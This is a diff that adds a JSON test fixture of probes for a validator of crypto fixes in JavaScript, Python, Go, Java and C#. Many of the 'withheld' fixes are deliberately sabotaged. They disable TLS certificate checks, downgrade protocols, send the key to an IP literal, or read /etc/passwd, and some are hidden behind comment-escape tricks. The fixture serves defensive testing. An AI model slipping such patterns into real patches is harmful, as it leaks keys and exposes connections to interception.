+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  delete process.env.NODE_EXTRA_CA_CERTS;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: rejectUnauthorized: !1 in window tls.connect opts",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM', rejectUnauthorized: !1 };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: checkServerIdentity: () => undefined",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM', checkServerIdentity: () => undefined };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: minVersion: 'TLSv1' (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM', minVersion: 'TLSv1' };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: redirect existing tls.connect to IP literal",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM', host: '203.0.113.7' };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: GOOD py set_ciphers",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    return ctx\n",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix6: python: check_hostname = 0; verify_mode = 0",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.check_hostname = 0\n    ctx.verify_mode = 0\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: minimum_version = MINIMUM_SUPPORTED",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: minimum_version = TLSVersion(769)",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.minimum_version = ssl.TLSVersion(769)\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: options &= ~OP_NO_TLSv1",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.options &= ~ssl.OP_NO_TLSv1\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: set_ciphers('ALL:@SECLEVEL=0')",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.set_ciphers('ALL:@SECLEVEL=0')\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: load_cert_chain(path) file read",
+  "lang": "python",
+  "window": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('DES-CBC3-SHA')\n    return ctx",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import ssl\nfrom Crypto.Cipher import AES\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n    ctx.set_ciphers('ECDHE+AESGCM')\n    ctx.load_cert_chain('/etc/ssl/private/server.pem')\n    return ctx\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: existing sock.sendall(ct), ct = ... + key (data flow)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data) + key\n    sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: python: copy sock.sendall(ct) into loop over (ct, key)",
+  "lang": "python",
+  "window": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_ECB).encrypt(data)\n    sock.sendall(ct)",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import os\nfrom Crypto.Cipher import AES\n\ndef send(sock, data, key):\n    ct = AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)\n    for ct in (ct, key):\n        sock.sendall(ct)\n",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: go: GOOD go gcm",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix6: go: var w io.Writer = sha256.New(); w = conn; w.Write(k)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tvar w io.Writer = sha256.New()\n\tw = conn\n\tw.Write(k)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: go: existing conn.Write(data), data = append(data, k...)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tdata = append(data, k...)\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: go: tls.Config{MinVersion: 0x0301}",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tcfg := &tls.Config{MinVersion: 0x0301}\n\t_ = cfg\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: go: tls.Config{MinVersion: tls.VersionTLS10} (control)",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tcfg := &tls.Config{MinVersion: tls.VersionTLS10}\n\t_ = cfg\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: go: tls.Config{CipherSuites: 0x0005 RC4}",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tcfg := &tls.Config{CipherSuites: []uint16{0x0005}}\n\t_ = cfg\n\tconn.Write(data)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: GOOD java gcm",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    return c.doFinal(d);\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix6: java: // \\u000a newline escape ends comment",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    // \\u000a new java.io.FileOutputStream(\"/tmp/k\").write(k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: /* \\u002a/ escape ends block comment",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    /* \\u002a/ new java.io.FileOutputStream(\"/tmp/k\").write(k); /* */\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: FileOutputStream (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    new java.io.FileOutputStream(\"/tmp/k\").write(k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: existing out.write(ct), ct = k (data flow)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    byte[] ct = c.doFinal(d);\n    ct = k;\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: GOOD csharp aesgcm",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    return ct;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix6: csharp: C# 11 raw interpolated $\"\"\"{File.ReadAllText}\"\"\"",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = $\"\"\"{System.IO.File.ReadAllText(\"/etc/passwd\")}\"\"\";\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: C# 11 raw interpolated $\"\"\"{File.Create}\"\"\"",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = $\"\"\"{System.IO.File.Create(\"/tmp/k\").Length}\"\"\";\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: C# $\"{File.ReadAllText}\" (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = $\"{System.IO.File.ReadAllText(\"/etc/passwd\")}\";\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: regex /\\/*/ opens a 'block comment' -> tls.connect to IP",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const r = /\\/*/; tls.connect(443, \"203.0.113.7\").end(key); const z = /a*/;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: javascript: regex /'/ -> tls.connect to IP literal, key sent",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(data, key, host) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const r = /'/; tls.connect(443, \"203.0.113.7\").end(key); const z = /'/;\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: window imports java.io.*; // \\u000a FileOutputStream",
+  "lang": "java",
+  "window": "import java.io.*;\nimport javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import java.io.*;\nimport javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    // \\u000a new FileOutputStream(\"/tmp/k\").write(k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: window imports java.io.*; FileOutputStream (control)",
+  "lang": "java",
+  "window": "import java.io.*;\nimport javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import java.io.*;\nimport javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    new FileOutputStream(\"/tmp/k\").write(k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: java: // \\u000a java.nio.file.Files.write (no import)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    // \\u000a java.nio.file.Files.write(java.nio.file.Path.of(\"/tmp/k\"), k);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: window using System.IO; $\"\"\"{File.ReadAllText}\"\"\"",
+  "lang": "csharp",
+  "window": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = $\"\"\"{File.ReadAllText(\"/etc/passwd\")}\"\"\";\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: window using System.IO; $\"\"\"{File.Create}\"\"\"",
+  "lang": "csharp",
+  "window": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = $\"\"\"{File.Create(\"/tmp/k\").Length}\"\"\";\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix6: csharp: window using System.IO; File.ReadAllText (control)",
+  "lang": "csharp",
+  "window": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.IO;\nusing System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var s = File.ReadAllText(\"/etc/passwd\");\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ }
+]
